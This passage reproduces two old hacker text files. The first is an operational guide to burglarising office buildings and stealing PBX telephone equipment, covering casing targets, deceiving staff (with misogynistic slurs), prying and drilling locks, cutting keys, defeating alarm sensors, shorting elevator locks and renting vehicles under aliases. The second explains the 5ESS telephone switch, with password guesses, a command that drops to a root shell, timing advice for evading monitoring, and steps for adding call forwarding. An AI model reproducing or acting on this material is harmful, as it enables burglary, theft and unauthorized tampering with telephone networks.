an overwhelming factor in determining a target however.  The smaller
systems are often easier to get at -- and ultimately to remove --
because they tend to be located in utility closets off publicly
accessible hallways as opposed to within a room inside an office space.
Those closets, sometimes labeled "telephone" and even unlocked, will be
found one or two per floor!  Other closets may exist for electrical
equipment, HVAC, plumbing, janitorial supplies, or for a combination of
these uses in addition to telephone service.
     A phone closet is easily distinguishable whether or not a switch or
key system is present.  A web of low-voltage (22 AWG), multi-colored
wiring will be channelled and terminated on a series of white "66"
blocks mounted on the wall.  These blocks are a few inches wide, and
roughly a foot long, with rows of metallic pins that the wiring is
punched into with a special tool.  As a general rule, if the system is
fastened to the wall and doesn't have at least one muffin fan built-in
and running, it's either a measly key system or a PBX too small to
deserve your attention.  Those worthy of your time will stand alone as a
cabinet with a hinged door, contain shelves of circuit cards, and
emanate the harmonious hum of cooling fans.  As an example, Mitel PBXs
commonly fit cozily in closets -- sometimes even one of the newer ROLMs
or a voice mail system.  On the other hand, an NT SL-100 should
not be an expected closet find.
     Wandering through office buildings in search of phone closets
during business hours is easy, so long as you dress and act the part.
You'll also want to look confident that you know what you're doing and
where you're going.  Remember, these buildings are open to the public
and an employee of one company can't tell whether or not you're a client
of another.  When going in and out of the phone closets, who's to know
you're not a technician or maintenance man?
     Apart from searching the closets, you can approach the secretaries.
Feign being lost and ask to use the telephone.  Steal a glance at the
console and you'll know (with a little practice) what type of PBX
they've got.  This is very valuable information, for it may save you
from unsuccessfully breaking into the closet (should it be locked) or
the company itself.  Secretaries are cute, courteous, and dumb.  You
shouldn't have a problem convincing her to give you the key to the phone
closet if you're posing as a technician.  If you're feeling as confident
as you should be, you may even get a date with the bitch.  And should
you ever raise suspicion, you always have the option of bailing out and
making a break for the stairwell.  No business exec is going to chase
you down.
     Some additional methods can be employed in conjunction with
visiting the buildings, or as a precursor to such :

-- Classified ads.  A company with job openings is all the more
vulnerable to your dark motives.  Using the help-wanted section of your
newspaper, look for receptionist and secretarial positions.  Call and
ask, "What type of phone system will I be required to handle?"  You may
also want to go in and apply for the job -- any job at a large firm will
do.  You'll learn the type of system installed, some details about
security, etc; this is a very sophisticated way of "casin' the joint."

-- Scanning for RMATS.  Using your preferred wardialer (such as
ToneLoc), scan business districts for PBX remote maintenance modems then
CNA your finds.

-- Targeting interconnects.  Interconnects are PBX dealers that sell,
install, and maintain the systems on contract.  Capture a database of
clients and you'll have a windfall of leads and pertinent info.  AT&T
allegedly sells its database by region.  Also, intercept voice mail or
company e-mail.  Interconnects make decent targets themselves.

-- Users groups and newsletters.  Some of the extremely large PBX owners
join users groups.  Though this is abstract, owners will discuss their
systems openly at the meetings.  Newsletters are mailed out to members,
often discussing special applications of specific locations in detail.
Great for making sales contacts.

Phase II : Extraction

     Removing the PBX calls for an assessment of obstacles versus
available means and methods.  The optimum plan incorporates a late
afternoon entry with a nighttime departure.  This means entering the
building during business hours and hiding, either in the PBX closet
itself or any room or empty space where you can wait until after hours
to re-emerge.  This is the most safest and effective of methods.  You
need not worry about alarms or breaking in from outside, and you can
take advantage of one of the greatest weaknesses in corporate office
security -- janitors.  The janitorial staff, if you act and dress
properly, will allow you to walk right into an office while they're
cleaning.  If you're already in an office and they enter, just act like
you own the place and it'll be assumed you work there.  If you prefer
not to be seen, keep hidden until the cleaning is done on your floor.
(Be sure not to make the idiotic mistake of hiding in the janitor's
closet).  Although the custodians will lock the doors behind them, any
alarms in the building will remain off until cleaning for the entire
structure is complete.
     There is simply nothing so elegant as entering the building during
the daytime hours, hiding, and re-emerging to wreak havoc when
everyone's gone.  (A patient wait is required -- take along a Phrack to
read).  Unfortunately, entry will not always be so easy.  The phone
closet may have a dead-bolt lock.  There may be no feasible hiding
place.  People may constantly be working late.  Because of all the
potential variables, you should acquire a repertoire of means and
methods.  Use of these methods, though easy to learn, is not so quickly
mastered.  There is a certain "fluidity of technique" gained only
through experience.  Deciding which to use for a given situation will
eventually come naturally.

-- Use of tools.  You can easily get around almost any office building
using only screwdrivers.  With practice, prying doors will be quick and
silent.  Although some doors have pry-guards or dead-bolts, about every
other phone closet you'll encounter can be opened with a screwdriver.
Before forcing the gap between door and frame, try sliding back the
locking mechanism.  For best results, work it both ways with a pair of
screwdrivers; a short one for leverage, a longer one for manipulation.
     For dead-bolts, a pipe wrench (a wrench with parallel grips) can
turn the entire lock 90 degrees.  Interior doors are cheaply
constructed; if you can wrench the lock, it'll turn and the bolt will be
pulled back into the door.  Quality dead-bolts have an inclined exterior
to prevent it from being gripped.  For these, diamond-cutting string can
be applied.  This is available at select plumbing supply houses for $150
upwards.

-- Ceilings and adjacent offices.  Not only are the doors cheap inside
office buildings, so are the walls.  If you're having trouble with a
door or lock, push up a ceiling tile with your screwdriver and see if
the wall stops or is continuous.  If it stops, you may choose to climb
over.  If you're already inside an office and find a particular room
locked, climbing is always an option because walls are never continuous
between rooms.  Walls are seldom continuous between business either; if
you can't get into a particular office space, try through adjacent
space.

-- Brute force.  If making noise is not a serious concern, a crowbar
will pry any door open.  For most situations requiring this level of
force, a sleek, miniature bar is all you need.  You can also saw or
hammer your way through any interior wall.  Once you've made a hole in
the sheetrock, you can practically break out the remainder of an opening
yourself using only your hands.
     From the outside, windows can be broken or removed.  Office
building glass is installed from the outside, so by removing the seal
and applying a suction device, you can pull the entire window out.
Breaking the glass is not too difficult, but frighteningly loud.  Using
a screwdriver, push the blade between the edge and its frame and pry.
Eventually you'll have holes and cracks running across the window.
Building glass is typically double-paned; once through the exterior
layer, you'll have to break the next.  Because the second layer isn't as
thick, you have the option of prying or smashing.  This sounds extremely
primitive -- it is, but it may be the only method available to you.
Highly-alarmed office structures do not have the windows wired.  When
there's a 5,000-port NEC NEAX 2400 in view and alarms everywhere else,
you'll break the fucking glass.

-- Alarm manipulation.  Entire files could be written on this subject.
Some relevant facts will be touched on here; no MacGyver shit.
     Our "typical" office building, if alarmed, has one of three types
of alarm plans.  The alarm system is either externally-oriented,
internally-oriented, or both.  More often than not, externally-oriented
alarm systems are encountered.  These focus on keeping outside intruders
from entering the building -- interior offices are secured only by
locks.  Alarm devices such as magnetic switches and motion detectors are
in place solely in lobby areas and on doors leading from outside.  If
you know in advance that you can readily enter any of the offices, the
alarm is harmless.  After entering, go directly into the office and look
out the window.  Eventually, security or police will arrive, look
around, then reset the alarm and leave -- so long as you haven't left
any trace of your entry (damaged doors, ceiling tile fragments, etc).
Although common areas and corridors will be briefly scanned, no company
offices will be entered.
     Internally-oriented alarm plans include alarms on individual
offices and are more difficult to reckon with.  However, the sensors are
only on the doors; any method that avoids opening the door can still be
used.
     Access controls like cardkeys are impressive in appearance but do
not automatically represent an alarm.  If you open the door without
inserting a cardkey, the system must be equipped to know whether a
person entered the building or exited.  Thus, only those systems with
motion detectors or a "push button to exit" sign and button can cause an
alarm at the cardkey-controlled door.  Otherwise the door and cardkey
device is no more than a door with an electronic lock.  There are always
exceptions to the rules, of course; never trust any alarm or access
control system.  Sometimes a system will be programed to assume any
opened door is someone entering, not exiting.  Check for sensors --
mounted flush on the door frame -- look carefully, they'll sometimes be
painted over.  Check both sides and top of the frame.  If a sensor is
found (or when in doubt) hold the door open for about ten seconds, then
wait and watch for up to an hour to see if there's a silent alarm.
     For the "push button to exit" entrances, you can sometimes use a
coat hanger or electricians fish tape to push the button from outside
using cracks around the door.  Where motion detectors automatically open
the entrance, similar devices can be employed to create enough commotion
to activate the detector (depending on detector type).
     Disabling part of the alarm system may be a possibility during the
day.  Chances are, if you can access the control CPU you've also got a
place to hide, and the control box is often alarmed against tampering
anyway.  Many of the latest systems are continuously monitored from a
central station.  If not, you can disconnect the alarm box from its
phone line.  Your best approach however is to alter a door
sensor/magnetic switch circuit.  You can use a piece of conductive hot
water duct tape to trick the sensor into thinking the door is always
closed.  This tape looks like tin foil with an adhesive on one side.
Obtain a similar sensor and test at home before relying on this --
magnetic switches come in many shapes and forms.  The better systems
don't even check for normally-open or normally-closed states, but for
changes in the loop's resistance.  This means simply cutting or
shorting the lead wires won't suffice.  But if the conductive tape won't
do, you can always just cut the leads and return in a couple days.  If
the cut hasn't been repaired, then you have an entry point.  Building
managers become lax with an alarm system after it's been installed for a
while and there haven't been any break-ins.  Other loops are disabled
after late-working employees repeatedly off the alarm.  One other option
is to cut and splice both parts of the sensor back into the loop so that
it remains unaffected by movement of the door.  The throughways to
target for any of these alterations are minor side doors such as parking
garage or stairwell exits.  You should be pleasantly surprised with the
results.

-- Locks and picks.  (This could be another textfile in itself).
Lockpicking is an extremely useful skill for PBX appropriation but
requires quite a bit of practice.  If you aren't willing to invest the
time and patience necessary to become effective with this skill,
screwdrivers are the next best thing.  Furthermore, with all the
different types and brands of locks in existence, you'll never be able
to solely rely on your lockpicking skills.  Acquire this ability if your
involvement in underworld activities is more than just a brief stint...

     You can more readily take advantage of the skills possessed by
locksmiths.  Because the offices within a typical building all use the
same brand lock with a common keying system, any of the locks can yield
the pattern for a master key to the whole system.  Obtain a spare lock
from the basement, maintenance room, or anywhere extra doors and
hardware are stored, and take it to a locksmith.  Request a key for that
lock and a master.  Many of the offices should now be open to you.
     Some keys are labeled with numbers -- if the sequence on the key
equals the number of pins in the lock, you can write down the number and
lock brand, and get a duplicate of the key cut.
     There is also a little locksmithing you can do on your own.  With a
#3 triangular "rat tail" file and a key blank to the brand lock you are
targeting, you can make your own key.  Blanks are either aluminum or
brass and scratch easily -- this is no accident.  By inserting a key
blank in the lock and moving it from side to side, you'll create
slate-colored scratch lines on the blank from the lock's pins.  The
lines will indicate where to begin filing a valley -- there'll be one
for each pin.  Move the file back and forth a few times and re-insert
the key to make new lines.  Use the point of the file only when
beginning the valley; successive passes should not create a point at the
bottom of the cut but leave a flat gap.  When no new scratch appears on
the bottom of a particular valley, don't file the valley any deeper --
it's complete.  Eventually, all the valleys will be cut and you'll have
a key to open the lock.
     Last but certainly not least, you can drill most locks where a
little noise can be afforded.  Using a 1/4 inch Milwaukee cordless drill
with about a 1/8 inch carbide-tipped bit, you can drill a hole the
length of the lock's cylinder.  Drill approximately 1/8 inch directly
above the keyhole.  This destroys the lock's pins in its path, and
allows others above to fall down into the hole.  Now the cylinder will
turn with any small screwdriver placed in the keyhole and open the lock.
Little practice is demanded of this technique, and it's a hell of a lot
of fun.

-- Elevator manipulation.  Elevators can be stubborn at times in
rejecting your floor requests.  Companies that occupy entire floors must
prevent an after-hours elevator from opening up on their unattended
office.  If there's a small lock corresponding or next to that floor's
selection button, unscrew the panel and short out the two electrical
leads on the other end of the lock.  Continue to short the contacts
until you press the button and it stays lit -- you'll then arrive at
your desired floor.
     The elevator motor and control room is located either on the roof
or penthouse level and can be frequently found accessible.  Besides
being a place to hide, sometimes you can find a bank of switches that
override the elevator's control panel (if for some reason you can't open
it or it's cardkey-controlled) and get to your floor that way.  Two
people with radios are needed to do this -- one in the equipment room,
one in the elevator.  Watch for high voltage and getting your coat
caught in a drive belt ...

Operation Integrity

     By taking advantage of daytime access, hiding places, and some of
the more sophisticated methods, there's no need to become an alarm
connoisseur or full-blown locksmith to liberate PBX equipment.  When
you can't avoid nighttime activity or an activated alarm system, then be
sure to take extra precautions.  Have lookouts, two-way radios, even a
police scanner.  Don't use CB radios, but rather HAM transceivers or
anything that operates on proprietary frequencies.  This will require a
small investment, but there's no price on your safety.
     Office buildings in downtown areas tend to be more secure than
those in the suburbs or outlying areas.  Location and surroundings are
important considerations when your operation takes place at night.  It
should also be noted that a building without a security guard (typically
the norm) may still subscribe to sporadic security checks where
rent-a-cops drive around the building at some regular interval.
     With regard to transportation and storage, rent vehicles and
facilities in alias names where appropriate.  Use taxis to pick you up
when you're departing with only a briefcase or single box of cards.  No
matter what the time may be, anyone seeing you enter a taxi in front of
the office will assume you're legit.
     It is our sincere wish that you apply this information to the
fullest extent in order to free yourself from becoming a mere tool of
capitalism, and use this freedom to pursue those things in life that
truly interest you.  We have tried to summarize and convey enough
basic information here to provide you with a complete underground
operation possibility.  All material in this file is based on actual
experience of the authors and their associates.

Introduction
~~~~~~~~~~~~

   Welcome to the world of the 5ESS.  In this file I will be covering
the switch topology, hardware, software, and how to program the switch.  I
am sure this file will make a few people pissed off <grin> over at BellCORE.
   Anyways, the 5ESS switch is the best (I think) all around switch. Far
better then an NT. NT has spent too much time with SONET and their S/DMS
TransportNode OC48.  Not enough time with ISDN, like AT$T has done. Not only
that, but DMS 100s are slow, slow, slow! Though I must hand it to NT, their
DMS-1 is far better then AT$T's SLC-96.



What is the 5ESS
~~~~~~~~~~~~~~~~

   The 5ESS is a switch. The first No. 5ESS in service was cut over in Seneca,
Illinois (815) in the early 1982.  This test ran into a few problem, but all
and all was a success.  The 5ESS is a digital switching system, this
advantage was realized in No. 4 ESS in 1976.  The 5ESS network is a TST
(Time Space Time) topology, the TSIs (Time Slot Interchangers) each
have their own processor, this makes the 5ESS one of the faster switches.
Though I hear some ATM switches are getting up there.

      (NCT) links.
    - Switches time slots from Interface Units to one of the NCT links (for
      intermodule calls).
    - Switches time slots from one Interface Unit to another within the SM
      (for intramodule calls).

    Digital Service Unit (DSU)

    - Local DSU provides high usage service circuits, such as tone decoders
      and generators, for lines and trunks terminated on the SM.
    - Global DSU provides low usage service circuits, such as 3-port
      conference circuits and the Transmission Test Facility, for all lines
      and trunks in the office (requires 64 time slots).

    - A maximum of 10 DSls maybe terminated on one DLTU.

   The SM may be equipped with any combination of LU's, TU's, DCLU's and DLTU's
totaling 512 time slots.


5ESS System Software
~~~~~~~~~~~~~~~~~~~~

   The 5ESS is a UNIX based switch. UNIX has played a large part in
switching systems since 1973 when UNIX was use in the Switching Control Center
System (SCCS).  The first SCCS was a 16 bit microcomputer. The use of
UNIX for SCCS allowed development in C code, pseudo code, load test,
structure and thought. This led the development of the other switching systems
which AT$T produces today (such at System 75, 85, 1AESS AP, and 5ESS).
NOTE: You may hear SCCS called the "mini" sometimes
   The 5ESS's /etc/getty is not set up for the normal login that one would
expect to see on a UNIX System. This is due to the different channels that
the 5ESS has. The some channels are the TEST Channel, Maintenance Channel,
and RC Channel (which will be the point of focus). Once you are on one
channel you can not change the channel, as someone has said " it is
not a TV!" You are physically on the channel you are on.


Test Channel
~~~~~~~~~~~~

   The TEST channel is where one can test lines, and test the switch itself.
This is where operating support systems (such as LMOS) operate from.
This channel allows one to monitor lines via the number test trunk aka
adding a third trunk), voltage test and line seizure.
Here is a list of OSSs which access the test channels on the 5ESS.

SCC Channel
~~~~~~~~~~~

   The SCC channel is where the SCC looks and watches the switch 24 hours a day,
seven days a week! From this channel one can input RC messages if necessary.
A lot of people have scanned these out, and though they were AMATs.  Well this
is in short, WRONG! Here is a sample buffering of what they are finding.

  This has nothing to do with AMA, this is switch output on say the SCC
channel.  This is used by the SCCS for logging, and monitoring of alarms.
The whole point of this channel is to make sure the switch is doing what it
should do, and to log all activity on the switch. NOTHING MORE!
   To go into these messages and say what they are would take far too long,
order the OM manuals for the 5ESS, watch out, they are about 5 times the size of
the IM (input manual) set.  On average it takes someone three years of training
to be able to understand all this stuff, there is no way anyone can write a
little file in Phrack and hope all who read it understand everything about the
5ESS. RTFM!


RC Channel
~~~~~~~~~~

   The RC/V (Recent Change/Verify) Channel is where new features can be added or taken
away from phone lines. This is the main channel you may come in contact with,
if you come in contact with any at all. When one connects to a 5ESS RC/V channel
one may be dumped to a CRAFT
shell if the login has not been activated.  Access to the switch when the
login is active is controlled by lognames and passwords to restrict
unwanted entry to the system.  In addition, the SCC (Switching Control
Center) sets permission modes in the 5ESS switch which control the RC
(recent change) security function.
   The RC security function determines whether recent changes may be made
and what types of changes are allowed.  If a situation arises where the RC
security function denies the user access to recent change via RMAS or RC
channels, the SCC must be contacted so that the permission modes can be
modified.  (Hint Hint)
   The RC security function enables the operating telephone company
to decide which of its terminals are to be allowed access to which
set of RC abilities.  NOTE that all verify input messages are always
allowed and cannot be restricted, which does not help too much.
     The RC security data is not part of the ODD (office dependent data).
Instead, the RC security data is stored in relatively safe DMERT operating
system files which are only modifiable using the following message:

SET:RCACCESS,TTY="aaaaa",ACCESS=H'bbbbb;

where: aaaaa = Symbolic name of terminal in double quotes
          H' = Hexadecimal number indicator in MML
       bbbbb = 5-character hexadecimal field in 5E4 constructed
               from binary bits corresponding to RC ability.
               The field range in hexadecimal is from 00000 to
               FFFFF.

     This message must be entered for each type terminal (i.e.
               "aaaaa"="rmas1", "rmas2", etc., as noted above in
                TTY explanations).


NOTE: Order IM-5D000-01 (5ESS input manual) or OM-5D000-01 (5ESS output manual)
for more information on this and other messages from the CIC at 1-800-432-6600.
You have the money, they have the manuals, do not ask, just order.  I
think they take AMEX!

     When the message is typed in, a DMERT operating system file is created
for a particular terminal.  The content of these files, one for each terminal,
is a binary field with each bit position representing a unique set of RC
abilities.  Conversion of this hexadecimal field to binary is accomplished
by converting each hexadecimal character to its equivalent
4-bit binary string.

Each bit position corresponds to a recent change functional area.
  A hexadecimal value of FFFFF indicates that all bit positions are
set to 1 indicating that a particular terminal has total RC access.  Also,
verify operations as well as lettered classes are not included in the
terminals security scheme since all terminals have access to verify views
and lettered classes.
  In addition, maintenance personnel are able to verify the security
code for any terminal by typing the following message from either
the MCC (Master Control Center) or SCCS (Switching Control Center System)
Mini terminal:

OP:RCACCESS,TTY="xxxxx";

where: xxxxx = symbolic name of terminal in double quotes.

Each bit position corresponds to a recent change functional area.

  To ensure redundancy, DMERT operating system files are backed up
immediately on disk by the SCC.
  The input message that defines the password and CLERK-ID (another name for
username) is in the Global RC feature.  This input message defines a clerk-id
and associated password or deletes an existing one. (Recall that CLERK-ID and
PASSWORD are required fields on the Global RC Schedule view 28.1 in
RCV:MENU:APPRC, but more on this later)

This new input message is as follows:

GRC:PASSWORD,CLERKID=xxxxxxxxxx,[PASSWD=xxxxxxxx|DELETE]

Note: CLERKID  can be from 1 to 10 alphanumeric characters and
      PASSWORD from 1 to 8 alphanumeric characters.

This input message can only be executed from the MCC or SCCS
terminals, and only one password is allowed per CLERK-ID.  To
change a clerk-id's password, this message is used with the same
CLERK-ID but with a different password.

When the security is set up on the RC/V channel, one will see:


----------------------------------------------------------------------------

5ESS login

15       WCDS0                    5E6(1)                   ttsn-cdN TTYW

Account name:


----------------------------------------------------------------------------

There are no defaults, since the CLERK-ID and the password are set by craft,
but common password would be the name of the town, CLLI, MANAGER, SYSTEM,
5ESS, SCCS1, SCC, RCMAC, RCMAxx, etc,...
      If one sees just a " < "  prompt you are at the 'craft' shell
of the RC/V channel, the 5E login has not been set. The Craft shell is
running on the DMERT (which is a UNIX environment development operating system,
a System V hack). The Craft shell prompt is a "<".  From this shell one
will see several error messages.  Here is a list and what they mean:

     Error Message   Meaning

     ?A              Action field contains an error
     ?D              Data field contains an error
     ?E              Error exists in the message but can not be resolved to
                     the proper field (this is the "you have no idea" message)
     ?I              Identification field contains an error
     ?T              Time-out has occurred on channel
     ?W              Warning exists in input line



     Other output message meanings, from the RC/V craft menu.

     OK              Good
     PF              Printout follows
     RL              Retry later
     NG              No good, typically hardware failure
                     (ie: SM does not exist)
     IP              In progress
     NA              The message was not received by the backup control
                     process



  When inputing RC messages it is best to do it in the middle of the day
since RC messages are sent to each channel! The SCC is watching and if
there are RC messages running across at 3 in the morning, the SCC is going
to wonder what the hell RCMAC (Recent Change Memory Administration Center)
is doing at three in the morning!  However, one may be hidden by MARCH's
soaking, and the night shift at the SCC are overloaded and may miss
what is going on while correcting other major problems. So it is up to
you.


DMERT
~~~~~

    The DMERT (Duplex Multiple Environment Real Time) uses the Western
Electric (another name for AT$T!) 3B20D  Duplex processor (or 2 3B20S
Simplex processors).  The DMERT software totals nearly nine thousand
source files, one million lines of non-blank source code,
and was developed by approximately 200 programers. There are eight main
releases of this software, they are referred to as generics (like 5E4.1,
5E4.2,  to 5E8.1 also seen as 5E4(1), 5E4(2) to 5E8(1), this can be though
of as DOS version).  DMERT is similar to regular UNIX but can be best described
as a custom UNIX system based on the 3B20D, the DMERT OS can be ported to
PDP-11/70s or a large IBM Mainframe. The DMERT operating system is split both
logically and physically.  Physically, the software is evenly divided across
the five (there were seven Software Development systems all running a 3B20S
where the DMERT code was written) Software Development systems. Logical, the
software is divided into twenty-four different subsystems.  To access this
from the "craft" shell of the RC/V channel, type:

RCV:MENU:SH!

NOTE:
This will dump one to a root shell, from which VaxBuster's (Who knows nothing
about VAXen, always wondered about him) file on how to redirect a TTY may
come in useful.


Programing the 5ESS
~~~~~~~~~~~~~~~~~~~

When programing the 5ESS there are things one should know, the first is that
one has a lot of power (just keep 911 in mind,  it would be foolish to even
think of disrupting anyones service.  911 is there for a reason, it should STAY
that way).  And anything one does is logged, and can be watched from the
SCC.  Note that the night SCC crew is a lot more lax on how things are done
then the day shift, so it would be best to do this at night.  I could tell you
how to crash the switch in two seconds, but that is not the point here.
Destroying something is easy, anyone can do that, there is no point to it.
All that taking down a switch will do is get one into jail, and get sued if
someone needed 911 etc,... (I think SRI is wishing they had talked to me
now).


RC from Craft Shell on RC/V Channel
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    RC and VFY is complex from the craft shell on the RC/V channel.
This is called the input text option.  It is accessed by using the

RCV:APPTEXT:

    This gets a little complex to follow, but the best thing to do
is to order the Manual 235-118-215 Recent Change Procedures Text Interface
[5E4] it is $346.87, another good one to get is 235-118-242, for $413 even
and last, but the best is 235-118-243, this beast is only $1344.63 what a
deal. When calling the CIC they will transfer you to a rep. from your area.
Gets to be kind of a pain in the ass, but.. Anyways, back on track:



RCV:APPTEXT:DATA[,SUMMARY|,NSUMMARY][,VFYIMMED|,VFYEND][,VFYNMVAL|,VFYSCIMG]
           [,DEVICE={STDOUT|ROP|ROP0|FILE|TTYx}],FORM=...,DATA,FORM=...,END;


DATA     -  This is for more then one RC operation in the same command

FORM     -  The format that is to be used

SUMMARY  -  Turns on one line summaries on the read only printer (ROP) (DEFULT)
NSUMMARY -  Turns off one line summary logging by the ROP

VFYIMMED -  Prints out verifies (VFYs) immediately, does not wait for
            session end.
VFYEND   -  Prints out all VFYs at session end, this is the DEFULT.

VFYNMVAL -  Print verify output in name-value pair format, this must be
            directed into a file (see DEVICE).
VFYSCIMG -  Makes output into screen size image (DEFULT).

DEVICE   -  Redirect verify output to a device other than ones screen.

            ROP/ROP0   -  Send verify output to the ROP

            STDOUT     -  Send verify output to ones screen (DEFULT)

            TTYx       - Send verify output to any valid tty (such as
                         ttya and ttyv) that exists in "/dev."  You
                         must use the tty name, not tty number.
            FILE       - Send verify output to a file in "/rclog".  The
                         file will be prefixed with "RCTX", and the user
                         will be given the name of the file at the
                         beginning and end of the APPTEXT session.
END      -  END of message.



 If the parameter is not entered on the command line, it may be
entered after the APPTEXT process begins, but must be entered prior to the
first "FORM=" statement. Here is a example of a MML RCV:APPTEXT.

rcv:apptext:data,form=2v1&vfy,set="oe.entype"&lset="oe.len"&xxxxxxxx,pty=i,vfy!

  The 2V1 may look strange at first, it may help getting use to the basics
first. To just VFY telephone numbers, just do a:

RCV:APPTEXT:DATA,FORM=1V6-VFY,TN=5551212,VFY,END!

   Though I can not really explain this any more then I have just due to
time and space.  These input messages may look complex at first, but are
really simple, and much better then dealing with the menu system, but
you will need to learn RC yourself! No one can explain it to you.


Pulling AMA from the RC/V channel Craft Shell
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


Pulling AMA up is done with one command. The command is:


OP:AMA:SESSION[,ST1|,ST2];

 This command will request a report of the current or most recent automatic
message accounting (AMA) tape. ST1 and ST2 are the data streams.



Pulling up out of Service Lines, Trunks or Trunk Groups
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

   One may want to pull up all the out of service lines, trunks, or
trunk groups for many reasons.  These reasons i will not go into, but
from which lines can be set up. The command to do this from the craft
shell is a PDS command, this command is with a 'ball bat' (a `` ! '').


   OP:LIST,LINES[,FULL][,PRINT][;[a][,b][,c][,d][,e]]!

   OP:LIST,TRUNKS[,FULL][,PRINT][;[a][,b][,c][,d][,e]]!

   OP:LIST,TG [,FULL][,PRINT][;[a][,b][,c][,d][,e]]!



FULL    -   All (primary and pending) are printed. Note FULL is not the
            default when inputing this command.

PRINT   -   Print to the ROP in the CO.  (Not a good idea)

a-e     -   This is port status to match against the subset of trunks, lines
            or trunk groups that are specified.  (This is required input
            for FULL)




The 5ESS RC/V Menu Shell
~~~~~~~~~~~~~~~~~~~~~~~~

To access this shell from the RC/V channel craft shell, type:

RCV:MENU:APPRC

at the `` < '' prompt.

To access the 5ESS RC/V menu system from the MCC, STLWS, and TLWS
channel/terminals, one uses what are called pokes.  The poke that
is used here to access the RC/V Menu system on the 5ESS is 196.

Type 196 at the `` CMD< '' prompt, and you are on the RC/V menu system
of the 5ESS switch. This will cause ``RC/V 196 STARTING'' and
``RC/V 196 COMPLETED'' to be printed out on the ROP.


Either way, this will toss you into a menu system. The main menu looks like
this:

------------------------------------------------------------------------------

Menu Commands:




------------------------------------------------------------------------------

  The help menus for the 5ESS switch are lame, but I though that it would
be good to show them to you just for the hell of it, because it does explain
a little about the switch.

When using the RC/V menu system of the 5ESS, you may go and just keep going into
sub-menus, and fall off the end of the Earth. Here are the navigational
commands that are used to move around the menu system. As seen from the
RC/V menu system help, you see "SCREEN X out of X."  This means that there are
so many screens to go and to move between the screens you use the `` < '' to
move back (toward main menu) and `` > '' to move to the last menu. I know it
is shown in the help menu, but it is not explained like it needs to be.



Batch Input
~~~~~~~~~~~

The Batch Input feature for the 5ESS switch allows recent changes (RC)
to be entered at any date and time when the RC update would be
performed.  This allows RC input to be entered quickly, and for a large
number of inputs. The large numbers of RC input can be released
quickly in  batch mode.  The RC input can then be entered at any time,
stored until needed, and then released for use by the system
whenever needed, at any specific date and/or time.
  First and second level error correction is done during batch input.
  There are several different modes of batch input. These are:

      BMI - batch mode input - TIMEREL and DEMAND
      BMD - batch mode display
      BMR - batch mode release



BMI - Batch Mode Input - TIMEREL and DEMAND


Entering BMI (Batch Mode Input), one types `` BMI '' at the RC/V
menu prompt. Once entering, you will be prompted with whether
the input is DEMAND (demand) or TIMEREL (Time Release). DEMAND
input allows one to manual have the batch update the database,
TIMEREL is automatic. TIMEREL has one enter a time and date.
  When using DEMAND, you will be prompted for the file name. The
file will be in `` /rclog '' in the DMERT OS.
  In TIMEREL, you will be prompted with the CLERK-ID, which in this
case is the file name for the file in the `` /rclog ''. Then
for VERBOSE options, the RC SRVOR (Recent Change Service Order)
is displayed on the screen.

BMD - batch mode display


   BMD is a "mask" of RC/V done from the RC/V channel craft shell, by using the
REPT:RCHIST or a pseudo menu system. All transactions are displayed on the ROP,
though the data could also be sent to a file in the `` /rclog '' in DMERT.
   The Pseudo menu system looks like:

----------------------------------------------------------------------------


1. Summary of clerk activity

2. Activity by service order number

3. Activity by clerk ID

4. Return to view or class menu.


----------------------------------------------------------------------------

1  allows one to view the "DELAYED RELEASE SUMMARY REPORT."
2  produces a "DELAYED RELEASE REPORT BY SERVICE ORDER."
3  produces the "DELAYED RELEASE REPORT BY CLERK ID."
4  Return to view or class menu, self-explanatory.



REPT:RCHIST - BMD

  The REPT:RCHIST BMD (Text) command is done from the RC/V channel craft
shell. The command synopsis is:


5E2 - 5E5 (Generics)

REPT:RCHIST,CLERK=[,FORMAT={SUMMARY|DETAIL}]{[,ALL]|[,PENDING][,COMPLETE]
[,ERROR][,DEMAND]}[,DEST=FILENAME][,TIME=XXXXXXXXXX];


5E6 - 5E8 (Generics)

REPT:RCHIST,CLERK=a[,FORMAT={SUMMARY|DETAIL}] {,ALL|,b}[,DEST={c|FILE}]
[,TIME=XXXXXXXXXX];

SUMMARY         - Report selection, format by key.
DETAIL          - Report selection for Recent Change entire.
ALL             - Report all recent changes.
PENDING         - Report pending recent change input.
COMPLETE        - Report released recent changes that was successful
                  when completed.
FILE            - Name for file in /rclog
ERROR           - Report recent changes released with error.
DEMAND          - Report demand recent changes.
TIME=XXXXXXXXXX - XX - mounth, XX - day, XX - hour, XX minute, XX - Second





BMR - batch mode release


    This is the manual release (updating) of the 5ESS database. This is done
from the RC/V channel craft shell.  The command that is used is the EXC:RCRLS
input message. There is no real need to go into this message.

Adding RCF (Remote Call Forward) on a 5ESS
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1. At the "MENU COMMANDS" commands prompt of the 5ESS main menu in the
   RC/V APPRC menu system of the 5ESS, enter '12' for the "BRCS FEATURE
   DEFINITION".  Then access screen '1.11', this is the BRCS screen. When it
   asks you to 'ENTER DATABASE OPERATION' enter "U" for Update and hit
   return.

   NOTE: When at menu '12,' you will NOT see '1.11' listed in the menu
   options.  By just accessing menu '1' you will not be able to add features.
   This is a problem with the 5ESS menu system.

2. Type in the Telephone Number. It should look like this:

form operation prompt

------------------------------------------------------------------------------

          I   -   to insert a form
          C   -   to change a field on a form
          V   -   to validate the form
          A   -   to display the desired screen number
          P   -   to print the current screen
          U   -   to update the form


   Enter `` C '' to change, access filed 11 and row 1 (goto the /CFV
   wherever it may be) or add /CFR if it is not there. If it does though,
   leave the "A" (Active) field "N" (Yes or No). Change the P (Presentation)
   column to "U" (Update). Then Hit Return.

   NOTE: Different Generics have other fields, one of them being a AC (Access
   Code) field.  This field is a logical field, that mean only accepts a
   "Y" for yes and "N" for no.  Also when adding the feature to the switch,
   the row and field numbers may not be shown, but will always follow this
   pattern.  Also note that the /CFV (Call forwarding variable) feature may not
   be there, there maybe no features on the line.  These examples are from
   Generic 4 (2).  Here is a example of 5E8 (which is not used too many places,
   but this is what menu 1.11 in the BRCS Feature Definition looks like:

   Enter a "U" for update and hit Return. It will say "FORM UPDATE".

3. Next access screen 1.22, call forwarding (line parameters) or it will
   just come up automatically if you set the "P" to "U".

4. If you used the automatic forms presentation, it will have the telephone
